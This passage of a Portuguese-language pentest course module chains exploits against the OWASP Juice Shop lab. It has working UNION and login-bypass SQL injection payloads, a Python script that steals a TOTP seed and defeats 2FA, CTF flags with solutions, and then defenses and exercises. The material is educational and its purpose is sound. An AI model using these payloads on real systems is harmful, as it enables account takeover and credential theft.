+inclusive o do admin (`0192023a…`) e o do wurstbrot — **resistem** à wordlist pequena.
+
+Você vazou **24** credenciais e recuperou **1** senha (`demo`). A flag do checkpoint é
+`FLAG{total-senha}` com esses dois dados.
+
+Guarde a lição, que decide o próximo elo: a quebra offline **não** te deu o admin nem o
+wurstbrot. Em vez de insistir numa wordlist maior, um bom pentester **muda de
+caminho** — e é o que faremos no elo 3.
+</Solution>
+
+<FlagInput task="checkpoint-exfiltracao" />
+
+### 5.5 Elo 3 — Roubar a semente de 2FA e tomar a conta (o objetivo)
+
+**Cenário:** o `demo` é um usuário qualquer. Você quer uma conta **protegida** — a
+prova de que a cadeia vence até o segundo fator. No Juice Shop, um usuário usa 2FA, e
+você vai tomar a conta dele sem saber a senha e sem o celular dele.
+
+**Seu objetivo final:** tomar a conta da vítima de 2FA e montar a flag
+`FLAG{vitima-8chars}`, onde `vitima` é a parte local do e-mail dela (antes do `@`) e
+`8chars` são os 8 primeiros caracteres da semente TOTP que você roubar.
+
+O caminho tem três encaixes: **(a)** achar quem usa 2FA e roubar a semente, **(b)**
+entrar como essa pessoa pulando a senha, **(c)** derrotar o segundo fator com a semente.
+
+<Hint title="Dica 1 — ache a semente (volte ao mesmo SQLi)">
+O mesmo `UNION` do elo 1, mas escolhendo a coluna `totpSecret` em vez de uma constante.
+Troque um dos campos por `totpSecret`:
+`... UNION SELECT id,email,password,totpSecret,'5','6','7','8','9' FROM Users--`. Quase
+todos vêm vazios; **um** usuário tem uma semente Base32 não vazia — essa é a sua vítima.
+</Hint>
+
+<Hint title="Dica 2 — entre como a vítima sem a senha (SQLi no login)">
+No `POST /rest/user/login`, injete no campo `email` o e-mail da vítima seguido de
+`'--` (aspa e dois traços), com uma senha qualquer. O `--` comenta a checagem de senha.
+Como a conta tem 2FA, o servidor **não** devolve o token direto: ele responde
+`{"status":"totp_token_required", ...}` com um `tmpToken`. Esse é o portão do segundo
+fator.
+</Hint>
+
+<Hint title="Dica 3 — calcule o OTP e passe pelo portão">
+TOTP é `HMAC-SHA1(semente, janela_de_30s)` truncado em 6 dígitos (RFC 6238). Você
+calcula com a `hashlib`/`hmac` do Python puro — sem instalar nada. Depois mande
+`POST /rest/2fa/verify` com o `tmpToken` e o `totpToken` (o código de 6 dígitos). Se o
+código estiver na janela certa, o servidor devolve o token de sessão **da vítima**.
+</Hint>
+
+<Solution title="Solução do objetivo">
+**(a) Roubar a semente** — o mesmo SQLi, agora puxando `totpSecret`:
+
+```console
+$ curl -s "http://juice-shop:3000/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2CtotpSecret%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20FROM%20Users--" \
+    | python3 -c '
+import sys, json
+for r in json.load(sys.stdin)["data"]:
+    seed = r.get("price")          # a 4a coluna escolhida (totpSecret) cai em "price"
+    if seed and str(seed) != "4" and len(str(seed)) >= 16:
+        print("vitima:", r["name"], "| semente TOTP:", seed)
+'
+vitima: wurstbrot@juice-sh.op | semente TOTP: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
+```
+
+A vítima é `wurstbrot@juice-sh.op`, e a semente começa com `IFTXE3SP`.
+
+**(b) Entrar como a vítima pulando a senha** — SQLi no login:
+
+```console
+$ curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    --data-binary '{"email":"wurstbrot@juice-sh.op'\''--","password":"qualquer"}'
+{"status":"totp_token_required","data":{"tmpToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."}}
+```
+
+A senha foi ignorada (o `--` comentou a checagem), mas o 2FA barrou: veio um `tmpToken`,
+não o token final.
+
+**(c) Derrotar o 2FA** — calcule o OTP da semente roubada e verifique. Este script faz
+os três passos de uma vez (TOTP em Python puro):
+
+```python
+import json, subprocess, base64, hmac, hashlib, struct, time
+
+T = "http://juice-shop:3000"
+def curl(args): return subprocess.check_output(["curl", "-s"] + args)
+
+def totp(seed, t=None):
+    key = base64.b32decode(seed)
+    counter = int((t or time.time()) // 30)
+    mac = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
+    o = mac[-1] & 0x0F
+    code = (struct.unpack(">I", mac[o:o+4])[0] & 0x7FFFFFFF) % 1_000_000
+    return f"{code:06d}"
+
+# (b) bypass de senha no login -> tmpToken
+login = json.loads(curl(["-X","POST", T+"/rest/user/login",
+    "-H","Content-Type: application/json",
+    "--data-binary", '{"email":"wurstbrot@juice-sh.op\'--","password":"x"}']))
+tmp = login["data"]["tmpToken"]
+
+# (c) calcula o OTP da semente roubada e passa pelo 2fa/verify
+otp = totp("IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH")
+verify = json.loads(curl(["-X","POST", T+"/rest/2fa/verify",
+    "-H","Content-Type: application/json",
+    "--data-binary", json.dumps({"tmpToken": tmp, "totpToken": otp})]))
+print("OTP calculado:", otp)
+print("autenticado como:", verify["authentication"]["umail"])
+```
+
+```console
+$ python3 takeover.py
+OTP calculado: 608773
+autenticado como: wurstbrot@juice-sh.op
+```
+
+Você entrou como `wurstbrot@juice-sh.op` — **sem a senha e sem o celular dele**. (O OTP
+muda a cada 30 s; se der erro de código, rode de novo, que o script recalcula.) O
+próprio Juice Shop reconhece a façanha: o desafio `twoFactorAuthUnsafeSecretStorageChallenge`,
+da categoria **Broken Authentication**, passa a `solved: true`:
+
+```console
+$ curl -s http://juice-shop:3000/api/Challenges | python3 -c '
+import sys, json
+for c in json.load(sys.stdin)["data"]:
+    if c["key"] == "twoFactorAuthUnsafeSecretStorageChallenge":
+        print(c["key"], "| solved:", c["solved"])'
+twoFactorAuthUnsafeSecretStorageChallenge | solved: True
+```
+
+Monte a flag `FLAG{vitima-8chars}` com a parte local do e-mail da vítima e os 8
+primeiros caracteres (maiúsculos, como vieram) da semente que você roubou.
+</Solution>
+
+<FlagInput task="objetivo-tomada-de-conta" />
+
+### 5.6 Documentar o caminho de ataque (sem flag)
+
+Executar a cadeia é metade do trabalho; a outra metade é **documentá-la** — é o que vira
+o relatório de um pentest. Antes de desligar, registre a cadeia como uma tabela de
+**pré-condição → passo → pós-condição → evidência**, assim:
+
+| # | Pré-condição | Passo (falha) | Pós-condição | Evidência |
+|---|---|---|---|---|
+| 1 | nenhuma (anônimo) | UNION SQLi na busca | 24 credenciais (e-mail + MD5) | resposta com 24 "produtos" |
+| 2 | 24 hashes | quebra offline (John) | 1 senha (`demo`); admin/wurstbrot resistem | saída do `john --show` |
+| 3a | base vazada | UNION SQLi (coluna `totpSecret`) | semente 2FA do wurstbrot | semente Base32 na resposta |
+| 3b | e-mail da vítima | SQLi no login (`'--`) | senha ignorada → `tmpToken` | `status: totp_token_required` |
+| 3c | semente + `tmpToken` | OTP calculado (HMAC-SHA1) | sessão do wurstbrot | `authenticated as wurstbrot` |
+
+Essa tabela é o **attack path**. Ela transforma "achamos um SQL injection de severidade
+média" em "este SQL injection leva, em cinco passos, à tomada de uma conta com 2FA" — e
+é isso que faz a empresa priorizar a correção. Na seção 9 você vai redigir as
+recomendações que acompanham cada linha.
+
+### 5.7 Desligar o laboratório
+
+```console
+$ scripts/lab.sh down juice-shop
+```
+
+Pela plataforma, o botão **Desligar** faz o mesmo. Como o Juice Shop guarda o estado em
+memória, subir de novo devolve tudo ao ponto de fábrica — inclusive os desafios voltam a
+`solved: false`.
+
+## 6. Variações e aprofundamento
+
+A cadeia da seção 5 é **um** caminho até "assumir uma conta privilegiada". Como a seção
+2.5 adiantou, o objetivo é um nó **OU**: há outros. Explorar as variações é o que separa
+quem seguiu um roteiro de quem entendeu o encadeamento.
+
+- **Caminho alternativo: tomar o admin direto.** Em vez de mirar o wurstbrot, injete no
+  login o clássico `' OR true--`. Sem e-mail específico, a condição `OR true` casa a
+  **primeira** linha da tabela — que é o admin. O servidor devolve um token com
+  `role: admin`, **sem senha e sem 2FA** (o admin do lab não tem segundo fator). É um elo
+  só, mais curto que a cadeia do wurstbrot, e leva a um privilégio **maior**. Dois
+  caminhos, duas lições: o mais curto nem sempre é o que você quer (o wurstbrot provou o
+  bypass de 2FA), e o objetivo tem mais de uma porta.
+- **Encadear com IDOR.** Com o token de admin do caminho acima, volte ao 4.5: o
+  `GET /rest/basket/{id}` não confere posse, então você lê os carrinhos de todos os
+  clientes. Agora a cadeia é SQLi → admin → <GlossaryTerm term="BOLA">BOLA</GlossaryTerm>:
+  escalonamento vertical seguido de horizontal.
+- **Encadear com XSS (4.3).** Uma cadeia muito comum no mundo real: um
+  <GlossaryTerm term="stored XSS">stored XSS</GlossaryTerm> rouba o token de sessão de
+  quem vê a página; com o token, você faz IDOR ou ações no nome da vítima. A pós-condição
+  do XSS (um token) é a pré-condição do próximo elo.
+- **Cadeias de API e GraphQL (4.9).** Em APIs, um endpoint que devolve dados demais
+  (<GlossaryTerm term="BOLA">BOLA</GlossaryTerm>) costuma ser o elo que entrega o
+  identificador ou o segredo que o próximo passo precisa. Em GraphQL, uma única consulta
+  pode puxar objetos em lote, encurtando a fase de coleta da cadeia.
+- **Cadeias que cruzam camadas.** As mais perigosas saem da aplicação: um SSRF (4.7) que
+  alcança um serviço interno, que expõe uma credencial de nuvem, que dá acesso ao banco.
+  O ProxyShell (seção 4) é desse tipo — da web ao sistema operacional.
+
+## 7. Erros comuns
+
+- **Contar colunas errado no `UNION`.** Se o número de campos não casa com a query
+  original, o banco rejeita e nada volta. Confirme as colunas (9, aqui) antes de montar a
+  carga, e lembre que o tipo também importa: ponha os dados nos campos de texto.
+- **Insistir num elo que trava.** Gastar uma hora numa wordlist gigante para quebrar o
+  hash do admin, quando o bypass do login o ignora, é perder tempo. Encadear é saber
+  **desviar**: se um elo resiste, procure outro caminho para a mesma pós-condição.
+- **Esquecer que o OTP expira.** O código vale ~30 segundos. Se o `2fa/verify` falhar com
+  "invalid", quase sempre é só o relógio: recalcule e reenvie. (Se persistir, confira que
+  a semente foi copiada inteira e em maiúsculas.)
+- **Perder a pós-condição de um passo.** Se você não salvou o `tmpToken` ou a semente, o
+  elo seguinte fica sem pré-condição. Documente (seção 5.6) **enquanto** executa, não
+  depois.
+- **Misturar tokens.** Numa cadeia você manuseia vários tokens (o seu, o de admin, o
+  `tmpToken`, o da vítima). Um `Authorization` com o token errado dá respostas confusas.
+  Nomeie suas variáveis (`TOKEN_ADMIN`, `TMP`, `TOKEN_VITIMA`).
+- **Quebrar o estado do lab.** Fez bagunça? `scripts/lab.sh down juice-shop` e `up`
+  reseta tudo — o Juice Shop recomeça do zero, inclusive os desafios.
+
+## 8. Defesa e mitigação
+
+Aqui a notícia é ótima: **para defender uma cadeia, você não precisa fechar todos os
+elos — basta fechar um**. Como o impacto vem da cadeia inteira, interromper qualquer
+passo deixa o atacante preso no meio. É o oposto do atacante, que precisa que **todos**
+os elos funcionem. Essa assimetria é o coração da **defesa em profundidade**.
+
+<Figure
+  src={arvoreDeAtaque}
+  alt="Árvore de ataque com o objetivo assumir uma conta privilegiada no topo, como nó OU, ligado a dois caminhos. Caminho A: SQL injection de bypass no login entra como admin e, com o token, um IDOR lê carrinhos de outros clientes. Caminho B: SQL injection rouba a semente de dois fatores do wurstbrot, outro SQL injection ignora a senha e o OTP calculado da semente vence o segundo fator. Uma faixa verde embaixo lista onde cada defesa corta a árvore: query parametrizada corta A e B na origem, controle de acesso no servidor corta o IDOR, hash salgado e semente 2FA não reversível esvaziam o caminho B. Como o topo é um nó OU, basta um caminho aberto para o atacante vencer."
+  caption="A mesma árvore de ataque da teoria, agora anotada com as defesas. Cada camada corta um ou mais ramos; como o objetivo é um nó OU, só fechar TODOS os caminhos tranca a porta."
+/>
+
+### 8.1 Corte a raiz: query parametrizada
+
+As duas injeções da cadeia (login e busca) são o **mesmo** defeito: a entrada do
+usuário vira parte da query. A cura é a
+<GlossaryTerm term="parameterized query">query parametrizada</GlossaryTerm> (prepared
+statement), que separa **código** de **dado** — a entrada nunca é interpretada como SQL.
+Isso corta **os dois** elos de SQLi de uma vez, e com eles tudo que vinha depois.
+
+```js
+// Vulnerável: a entrada é concatenada e pode fechar a string e emendar SQL.
+db.query("SELECT * FROM Users WHERE email = '" + email + "' AND password = '" + hash + "'");
+
+// Seguro: a entrada vai como PARÂMETRO; o driver nunca a trata como código.
+db.query("SELECT * FROM Users WHERE email = ? AND password = ?", [email, hash]);
+```
+
+### 8.2 Fortaleça o hash: sal e função lenta
+
+Se a base vazar mesmo assim (por outro caminho), as senhas não podem cair tão fácil.
+Troque MD5 por uma função **lenta e com sal**, feita para senhas:
+<GlossaryTerm term="bcrypt">bcrypt</GlossaryTerm>, scrypt ou Argon2. O
+<GlossaryTerm term="salt">sal</GlossaryTerm> único por usuário mata os ataques de
+dicionário em lote (dois iguais não têm o mesmo hash); a lentidão torna a quebra
+offline cara.
+
+```js
+// Vulnerável: MD5 sem sal — rápido de calcular, trivial de quebrar em lote.
+const stored = md5(password);
+
+// Seguro: bcrypt embute um sal aleatório e um custo configurável (lento de propósito).
+const stored = await bcrypt.hash(password, 12);
+```
+
+### 8.3 Guarde o segredo de 2FA como segredo
+
+O elo que fecha a cadeia é a semente de TOTP vazando legível. Uma semente de 2FA é um
+**segredo de longo prazo**, e vazá-la anula o segundo fator de todos de uma vez — é o
+"Unsafe Secret Storage" que dá nome ao desafio do Juice Shop. Guarde-a **cifrada no
+banco** (com uma chave que fica fora do banco, idealmente num cofre/HSM), de modo que um
+`SELECT` roubado não entregue o segredo utilizável. E imponha **limite de tentativas** no
+`2fa/verify`: sem isso, mesmo sem a semente, um atacante tentaria forçar o código de 6
+dígitos.
+
+### 8.4 Controle de acesso no servidor (corta o ramo do IDOR)
+
+No caminho alternativo (seção 6), o elo final era um IDOR. A defesa é a do 4.5: verificar
+**no servidor**, a cada requisição, se o objeto pedido pertence a quem pede, negando por
+padrão. Isso corta o ramo do IDOR da árvore mesmo que o SQLi não tivesse sido barrado.
+
+### 8.5 Pense em camadas, não em bugs
+
+- **Modele o ataque como árvore.** Ao desenhar os caminhos até um objetivo crítico, você
+  vê onde uma única defesa corta vários ramos (a query parametrizada) e onde ainda há um
+  caminho inteiro aberto.
+- **Rate limiting e monitoração.** Muitos 404/401 seguidos (varredura de ids, tentativas
+  de OTP, dicionário no login) são sinal de alguém montando uma cadeia. Detectar cedo
+  quebra o ataque no meio.
+- **Reduza a superfície.** Cada endpoint que devolve dado a mais é um elo em potencial.
+  Devolver só o necessário (nada de `totpSecret` ou `password` trafegando) encurta as
+  cadeias possíveis.
+- **Teste encadeando.** Um scanner acha bugs isolados; um pentester acha o caminho. Na
+  defesa, revise não só "este endpoint é seguro?", mas "o que a saída dele habilita?".
+
+## 9. Exercícios
+
+### Desafios práticos (sem flag)
+
+1. **O caminho mais curto.** Explore a variação da seção 6 (`' OR true--` no login) e
+   tome o **admin**. Compare, em duas frases, essa cadeia com a do wurstbrot: qual é mais
+   curta, qual dá mais privilégio, e por que as duas atingem o mesmo tipo de objetivo.
+2. **Encadeie até o IDOR.** Com o token de admin do exercício 1, leia o carrinho de outro
+   usuário por `GET /rest/basket/{id}`. Registre a cadeia completa (SQLi → admin → IDOR)
+   na tabela de pré/pós-condição da seção 5.6.
+3. **Feche um elo.** Escolha **um** elo da cadeia principal e descreva, em código ou
+   configuração, a defesa que o quebraria — e explique por que quebrar **só esse** já
+   impede a tomada da conta.
+4. **Escreva as recomendações.** Para cada linha da tabela de attack path (seção 5.6),
+   redija a correção em duas frases, no estilo de relatório: o que fazer e onde.
+
+### Quiz
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+Você deixou de olhar para falhas isoladas e passou a enxergar **caminhos**. Encadeou um
+UNION SQL injection (que vazou 24 credenciais), uma quebra offline (que te ensinou
+quando desviar), um segundo SQL injection mirando a coluna certa (que roubou a semente
+de 2FA) e um bypass de login somado ao cálculo do OTP (que tomou a conta protegida de
+`wurstbrot`). Viu, no ProxyShell, a mesma lógica derrubar o Microsoft Exchange no mundo
+real. E entendeu a defesa: como o impacto vem da cadeia inteira, **quebrar um único
+elo** — uma query parametrizada, um hash salgado, uma semente bem guardada — derruba
+tudo.
+
+### Cola rápida
+
+- **Exploit chain:** a pós-condição de um elo satisfaz a pré-condição do próximo. Impacto
+  **multiplicativo**, não aditivo.
+- **Nota de bug isolado engana:** uma falha "média" vira crítica quando o atacante fornece
+  a pré-condição que faltava (o ProxyShell e a CVE-2021-31207).
+- **Roteie em volta do elo forte:** o hash do admin resistiu; o bypass de login o tornou
+  irrelevante.
+- **Semente de 2FA é segredo de longo prazo:** vazou (por SQLi), o segundo fator caiu.
+- **Attack tree:** objetivo como nó OU → vários caminhos; a defesa precisa fechar
+  **todos**.
+- **Defesa em profundidade:** o atacante precisa de **todos** os elos; o defensor precisa
+  quebrar **um**. Essa assimetria é a sua vantagem.
+- **Documente o caminho:** o attack path (pré → passo → pós → evidência) é o produto do
+  mini-projeto e o que prioriza a correção.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- OWASP Web Security Testing Guide — [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection).
+- OWASP Cheat Sheet — [Multifactor Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
+  e [Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
+- RFC 6238 — [TOTP: Time-Based One-Time Password Algorithm](https://www.rfc-editor.org/rfc/rfc6238).
+- CISA — [registro de exploração ativa do ProxyShell (2021)](https://www.cisa.gov/news-events/alerts/2021/08/21/urgent-protect-against-active-exploitation-proxyshell-vulnerabilities).
